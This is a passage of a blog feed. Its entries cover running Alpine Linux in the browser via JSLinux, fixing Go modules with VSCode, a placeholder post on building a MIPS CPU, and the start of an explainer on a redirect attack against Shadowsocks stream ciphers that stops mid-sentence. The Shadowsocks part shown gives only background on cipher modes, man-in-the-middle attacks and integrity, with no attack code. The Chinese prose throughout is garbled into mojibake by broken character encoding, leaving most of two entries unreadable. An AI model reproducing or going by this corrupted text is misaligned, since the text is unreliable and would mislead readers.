        <content type="text/html" src="https://invariant.me/try-jslinux/"><![CDATA[<img src="https://invariant.me/content/images/2020/02/Alpine_logo.png" alt="Running Linux in your Browser with JSLinux"><p><a href="https://bellard.org/jslinux/">JSLinux</a> is an awesome emulator by <a href="https://bellard.org/">Fabrice Bellard</a> that implements full 32-bit x86 and RV32/RV64 RISC-V systems in the browser using WebAssembly.</p><p>Yesterday I <a href="https://github.com/losfair/jslinux-wstunnel">ported</a> JSLinux to use <a href="https://xtermjs.org/">xterm.js</a> for frontend and my <a href="https://github.com/losfair/wstunnel">wstunnel</a> for networking. Below is a live x86 virtual machine running Alpine Linux. Feel free to try it here (but please do not abuse the network interface) !</p><!--kg-card-begin: html--><iframe style="width: 100%; height: 500px" src="https://jslinux.invariant.me/widget.html">&lt;iframe disabled?&gt;</iframe><!--kg-card-end: html--><p></p>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/go-module-memo.html</id>
        <title><![CDATA[Go module Ë∏©ÂùëÂ§áÂøò]]></title>
        <updated>2020-02-16T09:25:24+08:00</updated>
        <link href="https://blog.rexskz.info/go-module-memo.html"/>
        <content type="text/html" src="https://blog.rexskz.info/go-module-memo.html"><![CDATA[<p>ÊúÄËøëÁî±‰∫é‰∏öÂä°ÈúÄÊ±ÇÔºåÈúÄË¶ÅÊñ∞ÂºÄ‰∏Ä‰∏™ Go ÁöÑÈ°πÁõÆ„ÄÇÂê¨ÊúãÂèãËØ¥ Go ‰ªé 1.11 ÂºÄÂßãÊúâ‰∫Ü‰∏™Âè´ Modules ÁöÑÊñ∞ÁâπÊÄßÔºå‰∫éÊòØÊâìÁÆóÁúãÁúãËÉΩÂê¶Áî®Âú®ÊàëÁöÑÊñ∞È°πÁõÆ‰∏≠„ÄÇ</p><p>‰∏∫‰ªÄ‰πàÊàëÂØπ Modules Ëøô‰πàÊÑüÂÖ¥Ë∂£Âë¢ÔºüÂõ†‰∏∫ÂÜôÈ°πÁõÆÊÄªÊòØÈÄÉ‰∏çÂºÄÂêÑÁßçÂåÖÁÆ°ÁêÜÔºåËÄå‰πãÂâç Go ‰∏çÁÆ°ÊòØÂÆòÊñπËøòÊòØÈùûÂÆòÊñπÁöÑÂåÖÁÆ°ÁêÜÂô®ÔºåÈÉΩÊòØÂü∫‰∫é <code>GOPATH</code> ÊàñËÄÖ <code>vendor</code> ÁõÆÂΩïÔºå‰πüÊó†Ê≥ïÂæàÂ•ΩÁöÑËß£ÂÜ≥‰∏çÂêåÁâàÊú¨ÁöÑÂÜ≤Á™Å„ÄÇModules ÊçÆËØ¥ÂèØ‰ª•Ëß£ÂÜ≥Ëøô‰∫õÈóÆÈ¢ò„ÄÇ</p><p>Êàë‰ª¨‰πãÂâçÁöÑÈ°πÁõÆÁî®ÁöÑÊòØ Go ÂÆòÊñπÁöÑÂåÖÁÆ°ÁêÜÂô® <code>dep</code>ÔºåÁúüÊòØË¢´Êàë‰ª¨ÂêêÊßΩ‰∫ÜÂ•Ω‰πÖÔºö</p><ul><li>ÂÆÉÈªòËÆ§‰∏çÊòæÁ§∫ËøõÂ∫¶ÔºåÈô§ÈùûÊâãÂä®Ê∑ªÂä† <code>-v</code> ÂèÇÊï∞Ôºõ</li><li>ÂëΩ‰ª§ÂçÅÂàÜËØ°ÂºÇÔºå‰ª•ÂÆâË£Ö‰∏∫‰æãÔºåÊàëËßÅËøáÁöÑÊúâÔºö<code>npm install</code>„ÄÅ<code>gem install</code>„ÄÅ<code>pip install</code>ÔºåËøòÊúâ‚Ä¶‚Ä¶<code>dep ensure</code>Ôºõ</li><li>ÊàëÊó†Ê≥ïÊää Go ÁöÑÈ°πÁõÆË∑üÂÖ∂ÂÆÉÈ°πÁõÆÊîæÂú®Âêå‰∏Ä‰∏™ Workspace ‰∏ãÈù¢ÔºåËÄåÂøÖÈ°ªÊîæÂà∞ <code>GOPATH</code> ‰∏ãÈù¢„ÄÇ</li></ul><p>ËØïÁî®‰∫Ü‰∏Ä‰∏ã ModulesÔºåÂèëÁé∞ÊúâËøôÂá†‰∏™Â•ΩÂ§ÑÔºö</p><ul><li>ÂÆÉÈªòËÆ§Âú®ÂÆâË£ÖÊó∂‰ºöÊòæÁ§∫ËøõÂ∫¶ÔºåÂú®ÂõΩÂÜÖ‰ºóÊâÄÂë®Áü•ÁöÑÁΩëÁªúÁéØÂ¢É‰∏ãÂèØ‰ª•ËΩªÊùæÁ°ÆÂÆöÁΩëÁªúÊòØÂê¶ÊúâÈóÆÈ¢òÔºõ</li><li>ÂÆÉÊòØ Go ÁöÑÂéüÁîüÂëΩ‰ª§Ôºå‰ΩøÁî®Ëµ∑Êù•Ë∑ü Go ÁöÑÂÖ∂ÂÆÉÂëΩ‰ª§ÊØîËæÉÂÉèÔºåÊ≤°ÊúâËøùÂíåÊÑüÔºõ</li><li>ÂÆÉÂÖÅËÆ∏Êàë‰ª¨Êää Go È°πÁõÆÊîæÂà∞‰ªªÊÑèÁöÑÂú∞ÊñπÔºõ</li><li>ÂÆÉÊúâ‰∏Ä‰∫õÂæàÊ£íÁöÑÂäüËÉΩÔºå‰æãÂ¶ÇÁîüÊàê‰æùËµñÂÖ≥Á≥ªÂõæ„ÄÅÁîüÊàê vendor Êñá‰ª∂Â§π„ÄÅÈ™åËØÅÂåÖÁöÑÂÜÖÂÆπ„ÄÅËß£Èáä‰∏∫‰ΩïÈúÄË¶Å‰æùËµñÊüê‰∏™ÂåÖ„ÄÇ</li></ul><p>ÂØπ‰∫éÂ§ßÈÉ®ÂàÜ‰∫∫Êù•ËØ¥ÔºåÁÖßÁùÄÁΩë‰∏äÁöÑÊïôÁ®ãÊù•ÂÅöÂ∞±ÂèØ‰ª•‰∫ÜÔºåÊàëÂú®ÂÅöÁöÑÊó∂ÂÄôÔºåÈÅáÂà∞‰∫Ü‰∏Ä‰∫õÈóÆÈ¢òÔºå‰∫éÊòØÂ∞±Âú®ËøôÈáåËÆ∞ÂΩï‰∏Ä‰∏ã„ÄÇ</p><h1>VSCode Êèí‰ª∂</h1><p>VSCode ÁöÑÊèí‰ª∂ <code>ms-vscode.go</code> Â∑≤ÁªèÂèØ‰ª•ÂÆåÁæéÊîØÊåÅ Go Modules ‰∫ÜÔºåÊõ¥Êñ∞Âà∞ÊúÄÊñ∞ÁâàÂç≥ÂèØ„ÄÇÁî±‰∫éÊàëËøòÊúâÈ°πÁõÆÈúÄË¶Å‰ΩøÁî® <code>dep</code>ÔºåÂõ†Ê≠§ÊàëÂú® <code>settings.json</code> ÈáåÈù¢Êñ∞Â¢û‰∫ÜËøô‰∫õÔºö</p><pre><code class="lang-json">{
    &quot;go.toolsEnvVars&quot;: {
        &quot;GO111MODULE&quot;: &quot;auto&quot;
    },
}</code></pre><p>ÁéØÂ¢ÉÂèòÈáè <code>GO111MODULE</code> ÁöÑÂèñÂÄºÊúâ‰∏â‰∏™Ôºö<code>off</code> Ë°®Á§∫Âº∫Ë°å‰ΩøÁî® <code>GOPATH</code> ÁöÑÊñπÊ≥ïÔºàÈÄÇÁî®‰∫é <code>dep</code>ÔºâÔºå<code>on</code> Ë°®Á§∫Âº∫Ë°å‰ΩøÁî® ModulesÔºå<code>auto</code> Ë°®Á§∫Â¶ÇÊûúÂèëÁé∞‰Ω†ÁöÑÈ°πÁõÆÂú® <code>GOPATH</code> ÈÇ£‰πàÂ∞±Áî®‰º†ÁªüÊñπÊ≥ïÔºàÂç≥‰ΩøÊúâ‰∫Ü <code>go.mod</code> Êñá‰ª∂ÔºâÔºåÂê¶ÂàôÂ∞±Áî® Modules„ÄÇ</p><h1>Êä•Èîô no package for import "fmt"</h1><p>ËøôÁßçÈîôËØØÂ∞±ÊØîËæÉÂ•áËë©‰∫ÜÔºåÊàëÁõ∏‰ø°ÂæàÂ§ö‰∫∫ÈÉΩÈÅáÂà∞ËøáÊâæ‰∏çÂà∞ÂÖ∂ÂÆÉÂåÖÁöÑÊÉÖÂÜµÔºå‰ΩÜÊàëËøôÂÑøËøû <code>fmt</code> ÈÉΩÊâæ‰∏çÂà∞‚Ä¶‚Ä¶</p><p>Êêú‰∫Ü‰∏Ä‰∏ãÔºåËøôÊòØ <code>gopls</code> ÁöÑÊä•ÈîôÔºå‰∫éÊòØÁî® <code>gopls -rpc.trace -v check file.go</code> Áúã‰∫Ü‰∏Ä‰∏ãÔºåÂèëÁé∞Áî±‰∫éÊàëÈ°πÁõÆÊñá‰ª∂ÁöÑÈóÆÈ¢òÔºåÊä•Èîô <code>initial workspace load failed</code>ÔºåËøô‰∏™ Workspace ÈáåÈù¢Â∫îÂΩìÂåÖÂê´ <code>./...</code> Âíå <code>builtin</code>Ôºå<code>fmt</code> Â±û‰∫éÂêéËÄÖÔºåÂõ†Ê≠§‰πüË∑üÁùÄÊâæ‰∏çÂà∞‰∫Ü„ÄÇ</p><p>ÈÇ£‰πàËØ•Â¶Ç‰ΩïÂú®È°πÁõÆ‰∏≠ÂºïÁî®È°πÁõÆÊú¨Ë∫´ÁöÑÂåÖÂë¢Ôºü‰æãÂ¶ÇÊàëÁöÑÈ°πÁõÆÂè´ <code>myproj</code>ÔºåÊàëË¶ÅÂú® <code>cmd/main.go</code> ÈáåÈù¢‰æùËµñ <code>cmd/server</code> ÂåÖ„ÄÇ</p><p>ÈÄöËøáÊêúÁ¥¢ÔºåÊàëÂæóÁü•ÂèØ‰ª•Âú® <code>go.mod</code> ÈáåÈù¢ÈÖçÁΩÆ‰∏ÄË°å <code>replace myproj =&gt; ./</code>ÔºåÊï¥‰∏™Êñá‰ª∂Â¶Ç‰∏ãÔºö</p><pre><code>module myproj

replace myproj =&gt; ./

go 1.13

require (
    ....
)</code></pre><p>‰πãÂêéÁöÑÂºïÁî®Â∞±ÂèØ‰ª•ËøôÊ†∑ÂÜô‰∫ÜÔºö</p><pre><code class="lang-go">import (
    &quot;myproj/cmd/server&quot;
)</code></pre><p>ÊúÄÂêéÊµã‰∫Ü‰∏Ä‰∏ãÔºåVSCode Êèí‰ª∂ÁöÑÂêÑÁßçÂäüËÉΩÔºàËá™Âä®ÂØºÂÖ•„ÄÅÊ†ºÂºèÂåñ„ÄÅË∑≥ËΩ¨„ÄÅË∞ÉËØïÔºâÈÉΩÊ≤°Êúâ‰ªÄ‰πàÈóÆÈ¢òÔºåËøôÂ∞±ÁÆóÊòØÂ§ßÂäüÂëäÊàê‰∫Ü„ÄÇËá≥‰∫éÁî®Ëµ∑Êù•ÂÖ∑‰ΩìÊÄé‰πàÊ†∑ÔºåËøòÊúâÊ≤°ÊúâÂÖ∂ÂÆÉÁöÑÂùëÔºåÂèØËÉΩÂæóÁ≠âËøá‰∏ÄÊÆµÊó∂Èó¥ÊâçËÉΩÁü•ÈÅì‰∫Ü„ÄÇ</p><h1>ÂèÇËÄÉËµÑÊñô</h1><ul><li><a href="https://github.com/golang/go/issues/32762#issuecomment-518828774">x/tools/gopls: failure to import package ¬∑ Issue #32762 ¬∑ golang/go</a></li><li><a href="https://stackoverflow.com/a/52124448">vgo - How do I resolve &quot;cannot find module for path X&quot; importing a local Go module? - Stack Overflow</a></li></ul>]]></content>
        <author>
            <name><![CDATA[R¬∑ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/designing-a-superscalar-ooo-mips-cpu-from-scratch/</id>
        <title><![CDATA[[PLACEHOLDER] Designing a superscalar MIPS CPU from scratch: #0]]></title>
        <updated>2020-02-16T07:31:33+08:00</updated>
        <link href="https://invariant.me/designing-a-superscalar-ooo-mips-cpu-from-scratch/"/>
        <content type="text/html" src="https://invariant.me/designing-a-superscalar-ooo-mips-cpu-from-scratch/"><![CDATA[<img src="https://images.unsplash.com/photo-1555589228-135c25ae8cf5?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=2000&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ" alt="[PLACEHOLDER] Designing a superscalar MIPS CPU from scratch: #0"><p>The CS undergraduate programme at <a href="https://nuaa.edu.cn/">NUAA</a> includes a (compulsory) Computer Organization course for this (4th) semester that requires implementing a MIPS CPU on the <a href="http://www.loongson.cn/index.html">Loongson</a> <a href="http://www.loongson.cn/news/company/628.html">development kit</a>, which is essentially a FPGA board + various useful modules.</p><p>As shown below, the suggested design is a classical 5-stage pipelined architecture:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://invariant.me/content/images/2020/02/--2020-02-16--2.39.51.png" class="kg-image" alt="[PLACEHOLDER] Designing a superscalar MIPS CPU from scratch: #0"><figcaption>Suggested basic 5-stage pipeline</figcaption></figure><p>But it's boring to write "yet another" CPU that implements only the simplest structures. So I decided to extend the design a bit, and build a <a href="https://en.wikipedia.org/wiki/Superscalar_processor">superscalar</a> <a href="https://en.wikipedia.org/wiki/Out-of-order_execution">OoO</a> architecture from the ground up.</p><p>During the next few months I will post my experience as a series of posts both here and on WeChat. <a href="https://invariant.me/subscribe/">Subscribe</a> to stay updated!</p>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/redirect-attack-weakness-of-ss-stream-cipher.html</id>
        <title><![CDATA[Redirect attack - Shadowsocks ÊµÅÂØÜÁ†ÅÁöÑ‰∏çÂÆâÂÖ®Âõ†Á¥†]]></title>
        <updated>2020-02-14T18:18:00+08:00</updated>
        <link href="https://blog.rexskz.info/redirect-attack-weakness-of-ss-stream-cipher.html"/>
        <content type="text/html" src="https://blog.rexskz.info/redirect-attack-weakness-of-ss-stream-cipher.html"><![CDATA[<p>Shadowsocks ÊòØ‰∏ÄÊ¨æÈô™‰º¥Êó†Êï∞Áé©ÂÆ∂Â§öÂπ¥ÁöÑÁßëÂ≠¶‰∏äÁΩëÂ∑•ÂÖ∑Ôºå‰ΩÜÊòØËøëÂπ¥Êù•ÈöèÁùÄÂ¢ôÁöÑÊó•ÁõäÂ¢ûÈ´òÔºå‰∏Ä‰∫õ Shadowsocks ÊµÅÈáèÂ∑≤ÁªèÂèØ‰ª•Ë¢´ÂæàÂ•ΩÁöÑËØÜÂà´Âá∫Êù•ÔºåÁÑ∂ÂêéÂ∞±ÊòØ‚Äî‚Äî‚ÄúÂêåÂøóÔºå‰Ω†Ê¢ØÂ≠êÂ°å‰∫Ü‚Äù„ÄÇ</p><p>ËôΩÁÑ∂‚ÄúÂçèËÆÆÂèØ‰ª•Ë¢´ËØÜÂà´‚ÄùÂ∑≤Áªè‰ºóÊâÄÂë®Áü•Ôºå‰ΩÜÊàë‰ª¨‰æùÊóßËÆ§‰∏∫ÔºåShadowsocks ÁöÑÂä†ÂØÜÂÅöÁöÑ‰∏çÈîôÔºå‰∏≠Èó¥‰∫∫Â∫îÂΩìÁ†¥Ëß£‰∏çÂá∫ÊòéÊñá‰ø°ÊÅØ„ÄÇ</p><p>ÁÑ∂ËÄåÔºåÊôö‰∏äÁúãÂà∞ÁöÑ‰∏ÄÁØá <a href="https://github.com/edwardz246003/shadowsocks/blob/master/Redirect%20attack%20on%20Shadowsocks%20stream%20ciphers.pdf">ÊñáÁ´†</a>ÔºåÁ®çÁ®çÂä®Êëá‰∫Ü‰∏Ä‰∏ãÊàëÂØπ Shadowsocks Êï∞ÊçÆÂÆâÂÖ®ÁöÑ‰ø°ÂøÉÔºåÊõ¥ËÆ©ÊàëÈáçÊñ∞ÂÆ°ËßÜ‰∫Ü‰∏Ä‰∏ãÊµÅÂØÜÁ†ÅÁöÑÂÆâÂÖ®ÊÄß„ÄÇ‰πãÂâçÊàëÂú®ÂÅöÂÆâÂÖ®ÊñπÈù¢ÁöÑÁßëÊôÆÁöÑÊó∂ÂÄôÔºåÊàëÊÄª‰ºöÊèêÂà∞‚ÄúECB ÊòØ‰∏çÂÆâÂÖ®ÁöÑ‚ÄùÔºå‰ΩÜÁé∞Âú®ÂèëÁé∞ÔºåÂÖ∂ÂÆÉÁöÑ‰∏Ä‰∫õÊµÅÂØÜÁ†Å‰πü‰∏ç‰∏ÄÂÆöÂÆâÂÖ®ÔºåÂõ†‰∏∫ÂÆÉ‰ª¨Ê≤°Êúâ‰øùËØÅÊï∞ÊçÆÁöÑÂÆåÊï¥ÊÄßÔºåÂõ†Ê≠§Â≠òÂú®Êï∞ÊçÆË¢´ÁØ°ÊîπÁöÑÂèØËÉΩÊÄß„ÄÇ</p><blockquote><p>Shadowsocks Â¶ÇÊûúÈÖçÁΩÆÂæóÂΩìÔºåËøòÊòØÊØîËæÉÂÆâÂÖ®ÁöÑÔºåÊàñËÄÖËá≥Â∞ëÂèØ‰ª•ËÆ©ÁõÆÂâçÁöÑÁ†¥Ëß£ÊñπÊ≥ïÊ≤°ÊúâÁî®Ê≠¶‰πãÂú∞„ÄÇÂ¶ÇÊûúÁúãÂÆåÊú¨ÊñáÂêé‰æùÊóß‰∏çÊîæÂøÉÔºåÂèØ‰ª•‰ΩøÁî®ÂÖ∂ÂÆÉÁöÑÁßëÂ≠¶‰∏äÁΩëÂ∑•ÂÖ∑„ÄÇ</p><p>Êú¨ÊñáÁöÑ‰∏Ä‰∫õÂõæÁâáÂºïÁî®Ëá™Áª¥Âü∫ÁôæÁßëÔºåÂèØËÉΩÈúÄË¶ÅÁßëÂ≠¶Âú∞ËßÇÁúã„ÄÇ</p></blockquote><h1>‰∏Ä‰∫õÂü∫Êú¨Ê¶ÇÂøµ</h1><p>ËÄÉËôëÂà∞ÂèØËÉΩÊúâ‰∫õÂêåÂ≠¶Ê≤°ÊúâÂØÜÁ†ÅÂ≠¶ÁöÑÂü∫Á°ÄÔºå‰πüÂØπ Shadowsocks ÁöÑÂçèËÆÆ‰∏çÊòØÂæà‰∫ÜËß£ÔºåËøôÈáåÂ∞±ÁÆÄÂçïÁöÑ‰ªãÁªç‰∏Ä‰∏ã„ÄÇÂ¶ÇÊûúÊÇ®Â∑≤ÁªèÊúâË∂≥Â§üÁöÑÁü•ËØÜÔºåÂèØ‰ª• <a href="#toc-link-5">Ë∑≥Âà∞‰∏ã‰∏ÄËäÇ</a>„ÄÇ</p><h2>ÊµÅÂØÜÁ†Å</h2><p>Áõ∏‰ø°‰∏çÂ∞ë‰∫∫ÈÉΩÂê¨ËØ¥Ëøá AES ‰πãÁ±ªÁöÑÂØπÁß∞Âä†ÂØÜÁÆóÊ≥ïÔºå‰ΩÜÂπ∂Ê≤°Êúâ‰∫ÜËß£ÁöÑÈÇ£‰πàÁªÜËá¥„ÄÇ‰æãÂ¶Ç‰ªÄ‰πàÊòØ IVÔºü‰ªÄ‰πàÊòØÂü∫‰∫éÊï∞ÊçÆÂùóÁöÑÂä†ÂØÜÔºü</p><p>‰∫ãÂÆû‰∏äÔºåAES ÁÆóÊ≥ïÊú¨‰ΩìÂπ∂‰∏çÊòØ‰∏∫‰∫ÜÂ§ÑÁêÜÊó†ÈôêÈïøÂ∫¶ÁöÑÂ≠óÁ¨¶‰∏≤ËÄåËÆæËÆ°ÁöÑÔºåÂÆÉ‰∏ÄÊ¨°Âè™ËÉΩÂ§ÑÁêÜ 16 ‰∏™Â≠óËäÇÔºà‰∏çÁÆ°ÊòØ <code>AES-128</code> ËøòÊòØ <code>AES-256</code>ÔºâÔºåÊàë‰ª¨ÁÆ°Ëøô 16 ‰∏™Â≠óËäÇÂè´ÂÅö‰∏Ä‰∏™‚ÄúÊï∞ÊçÆÂùó‚ÄùÔºåAES Â∞±ÊòØ‰∏Ä‰∏™Âü∫‰∫éÊï∞ÊçÆÂùóÁöÑÂä†ÂØÜÁÆóÊ≥ï„ÄÇÂØπ‰∫éËøô‰∏ÄÁº∫Èô∑ÔºåÂèØ‰ª•Áî®ËøôÊ†∑‰∏ÄÁßçÊÄùË∑ØÔºöÂÖàÂ∞ÜÊòéÊñáÂàáÂâ≤ÊàêËã•Âπ≤‰∏™Êï∞ÊçÆÂùóÔºåÂØπ‰∫éÊØè‰∏™ÂùóÁî® AES ÂÅöÂä†ÂØÜÔºåÂÜçÊääÊØè‰∏™Âä†ÂØÜÂêéÁöÑÂùóÊãºËµ∑Êù•„ÄÇ</p><p>ÊòØ‰∏çÊòØÂæàÁÆÄÂçïÔºüÂÖ∂ÂÆûËøôÂ∞±ÊòØ ECB Ê®°Âºè„ÄÇ‰ΩøÁî®Ëøô‰∏™ÊÄùË∑ØÁöÑ <code>AES-256</code> ÁÆóÊ≥ïË¢´Áß∞‰∏∫ <code>AES-256-ECB</code>„ÄÇÁî±‰∫é 16 Â≠óËäÇÂØπ‰∫é‰∏Ä‰∫õÊï∞ÊçÆÊù•ËØ¥ÂÆûÂú®ÊòØÂ§™Â∞èÔºåÂæàÂÆπÊòìÂá∫Áé∞Â§ßÈáèÈáçÂ§çÁöÑÂùó„ÄÇ‰æãÂ¶ÇÊúâËøôÊ†∑‰∏ÄÂº†ÂõæÁâáÔºö</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/5/56/Tux.jpg" alt="Original image" title="Original image"></p><p>Â§ßÂÆ∂ÈÉΩÁü•ÈÅìËøôÊòØ‰∏ÄÂè™Â∞è‰ºÅÈπÖÔºåÊàë‰ª¨Áî® ECB Âä†ÂØÜ‰∏Ä‰∏ãÂÜçÁúãÁúãÔºö</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/f/f0/Tux_ecb.jpg" alt="Encrypted using ECB mode" title="Encrypted using ECB mode"></p><p>Â∫îËØ•‰æùÊóßËÉΩÁúãÂá∫Êù•Âõæ‰∏≠ÊòØÂàöÊâçÈÇ£Âè™Â∞è‰ºÅÈπÖ„ÄÇECB Ê®°ÂºèÊó†Ê≥ïÈöêËóèÂéüÊñáÁöÑÁâπÂæÅÔºåËØ∑Â§ßÂÆ∂Â∞ΩÈáè‰∏çË¶Å‰ΩøÁî®„ÄÇ</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d6/ECB_encryption.svg/601px-ECB_encryption.svg.png" alt="Electronic Codebook (ECB) mode encryption" title="Electronic Codebook (ECB) mode encryption"></p><p>Êúâ‰∏Ä‰∫õÊîπËâØÁöÑÊñπÊ≥ïÔºå‰æãÂ¶ÇÈô§‰∫ÜÂØÜÁ†Å‰ª•Â§ñÔºåÂÜçÊèê‰æõ‰∏Ä‰∏™ÂàùÂßãÂêëÈáè <code>IV</code> ‰Ωú‰∏∫Á¨¨ 0 ‰∏™Êï∞ÊçÆÂùóÔºåÂú®Âä†ÂØÜÁ¨¨ i ‰∏™Âùó‰πãÂâçÔºåÂÖàÂ∞ÜÊòéÊñáË∑ü‰∏ä‰∏Ä‰∏™ÂùóÁöÑÂä†ÂØÜÁªìÊûúÂºÇÊàñ‰∏Ä‰∏ãÔºåÂç≥Ôºö</p><pre><code class="lang-text">Cipher[0] = IV
Cipher[i] = Encrypt(Plain[i] ^ Cipher[i - 1])</code></pre><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/80/CBC_encryption.svg/601px-CBC_encryption.svg.png" alt="Cipher Block Chaining (CBC) mode encryption" title="Cipher Block Chaining (CBC) mode encryption"></p><p>ËøôÁßçÊñπÂºè‰ºöÊØîÂàöÊâçÁöÑ ECB ÂÆâÂÖ®ÂæóÂ§ö„ÄÇ</p><p>ËøòÊúâÂÖ∂ÂÆÉÁöÑ‰∏Ä‰∫õÊñπÂºèÔºåÊâÄÊúâÁöÑËøô‰∫õÊñπÂºèÔºàÂåÖÊã¨ ECBÔºâÁªüÁß∞‰∏∫‚ÄúÊµÅÂØÜÁ†Å‚Äù„ÄÇ‰∏ÄÂºÄÂßãÁöÑÈÇ£Âº†Â∞è‰ºÅÈπÖÔºåÁî® ECB ‰ª•Â§ñÁöÑÊñπÂºèÂä†ÂØÜ‰πãÂêéÊòØËøôÊ†∑ÁöÑÔºåÂ∑≤ÁªèÂÆåÂÖ®Áúã‰∏çÂá∫ÊòØ‰ªÄ‰πà‰∫ÜÔºö</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/a/a0/Tux_secure.jpg" alt="Modes other than ECB result in pseudo-randomness" title="Modes other than ECB result in pseudo-randomness"></p><h2>‰∏≠Èó¥‰∫∫ÊîªÂáª</h2><p>‰∏≠Èó¥‰∫∫ÊîªÂáªÊòØ‰∏™ÊØîËæÉÂ•ΩÁé©ÁöÑ‰∏úË•øÔºåÂÅáËÆæÊîªÂáªËÄÖÂà©Áî®‰∏Ä‰∫õÊñπÊ≥ïÔºàÊØîÂ¶ÇÁî®‰∏Ä‰∏™ÈíìÈ±ºÁÉ≠ÁÇπÔºâËÆ©ÂèóÂÆ≥ËÄÖÂèëÂá∫ÁöÑÊï∞ÊçÆÂåÖËµ∞Âà∞‰∫ÜËá™Â∑±ËøôÈáåÔºåÈÇ£‰πàÊîªÂáªËÄÖÂ∞±ÂèØ‰ª•Êü•ÁúãÊàñËÄÖ‰øÆÊîπÊï∞ÊçÆÂåÖÁöÑÂÜÖÂÆπ„ÄÇÂ∞±Â•ΩÂÉèÂ∞èÊòéÂú®ËØæ‰∏äÁªôÂ∞èÁ∫¢‰º†Á∫∏Êù°ÔºåÊú¨Êù•ÂÜôÁöÑÊòØ‚ÄúÊàëÂñúÊ¨¢‰Ω†‚ÄùÔºå‰ΩÜÂú®ÁªèËøáÂ∞è‰∫ÆÁöÑÊó∂ÂÄôÔºåÂ∞è‰∫ÆÁî®Ëá™Â∑±ÁöÑÁ∫∏Êù°ÊõøÊç¢‰∫Ü‰ªñ‰ª¨ÁöÑÔºå‰∏äÈù¢ÂÜôÁùÄ‚ÄúÊªöÁääÂ≠êÂêß‚ÄùÔºåÂèØËßÅ‰∏≠Èó¥‰∫∫ÊîªÂáªÂØπÊàë‰ª¨ÁöÑÂΩ±ÂìçÊúâÂ§öÂ§ß„ÄÇ</p><blockquote><p>Ê≥®ÔºöÂú®ËØæ‰∏ä‰º†Á∫∏Êù°ÊòØ‰∏çÂ•ΩÁöÑË°å‰∏∫ÔºåÂ∞èÊúãÂèã‰ª¨‰∏çË¶ÅÊ®°‰ªø„ÄÇ</p></blockquote><p>Â§ßÂÆ∂Âú®Êó•Â∏∏ÁîüÊ¥ª‰∏≠ÊúÄÂ∏∏ÁªèÂéÜÁöÑ‰∏≠Èó¥‰∫∫ÊîªÂáªÔºåÂèØËÉΩÊòØÂú®ËÆøÈóÆÊüê‰∫õ HTTP ÁΩëÁ´ôÁöÑÊó∂ÂÄôÔºåÁ™ÅÁÑ∂ÂºπÂá∫‰∏Ä‰∏™‚ÄúÂÆΩÂ∏¶Âà∞ÊúüÈúÄË¶ÅÁª≠Ë¥π‚ÄùÁöÑÈÄöÁü•„ÄÇËøôÁßç‰∏≠Èó¥‰∫∫ÊîªÂáªÊòØ‰∏Ä‰∫õÊó†ËâØËøêËê•ÂïÜÂπ≤ÁöÑÔºå‰∏çËøáÊàë‰ª¨Êõ¥‰π†ÊÉØÊääÂÆÉÂè´ÂÅö‚ÄúÊµÅÈáèÂä´ÊåÅ‚Äù„ÄÇ</p><h2>Êï∞ÊçÆÂÆåÊï¥ÊÄß</h2><p>Ëøô‰∏ÄÊÆµÂ∞±ÂÅ∑‰∏™ÊáíÔºåÁõ¥Êé•ÊëòÊäÑÁôæÂ∫¶ÁôæÁßë‰∫ÜÔºàÊúâÂà†ÊîπÔºâÔºö</p><blockquote><p>ÂÆåÊï¥ÊÄßÊòØ‰ø°ÊÅØÂÆâÂÖ®ÁöÑ‰∏â‰∏™Âü∫Êú¨Ë¶ÅÁÇπ‰πã‰∏ÄÔºåÊåáÁî®Êà∑„ÄÅËøõÁ®ãÊàñËÄÖÁ°¨‰ª∂ÁªÑ‰ª∂ÂÖ∑ÊúâËÉΩÂäõÔºåËÉΩÂ§üÈ™åËØÅÊâÄÂèëÈÄÅÊàñ‰º†ÈÄÅÁöÑ‰∏úË•øÁöÑÂáÜÁ°ÆÊÄßÔºåÂπ∂‰∏îËøõÁ®ãÊàñÁ°¨‰ª∂ÁªÑ‰ª∂‰∏ç‰ºöË¢´‰ª•‰ªª‰ΩïÊñπÂºèÊîπÂèò„ÄÇ</p></blockquote><p>ÁøªËØëÊàêÁôΩËØùÂ∞±ÊòØÔºöËÉΩ‰øùËØÅÊï∞ÊçÆÂú®‰º†ËæìËøáÁ®ã‰∏≠‰∏çË¢´ÁØ°ÊîπÔºåÂ∞èÁ∫¢Êî∂Âà∞ÁöÑÁ∫∏Êù°ÂÜÖÂÆπË∑üÂ∞èÊòé‰º†Âá∫ÂéªÁöÑ‰∏ÄÊ®°‰∏ÄÊ†∑„ÄÇ</p><ul><li>Â§ßÂÆ∂Âê¨ËØ¥ËøáÁöÑ ECC ÂÜÖÂ≠òÁ∫†ÈîôÁÆóÊ≥ïÂ∞±ËÉΩ‰øùËØÅÊï∞ÊçÆÂÆåÊï¥ÊÄßÔºåÂÆÉÂèØ‰ª•ÂèëÁé∞ÂÜÖÂ≠òÊï∞ÊçÆË¢´ÁØ°ÊîπÔºà‰æãÂ¶ÇÈÅ≠Âèó‰∫ÜÈ´òËÉΩÁ≤íÂ≠êÂÜ≤ÂáªÊàñÁ°¨‰ª∂ÁöÑÈÉ®ÂàÜÊçüÂùèÔºâÔºåÂπ∂ÈÄöËøá‰∏Ä‰∫õÁÆóÊ≥ïÂ∞ΩÈáèÊÅ¢Â§çË¢´ÊçüÂùèÁöÑÈÉ®ÂàÜÔºõ</li><li>HTTPS 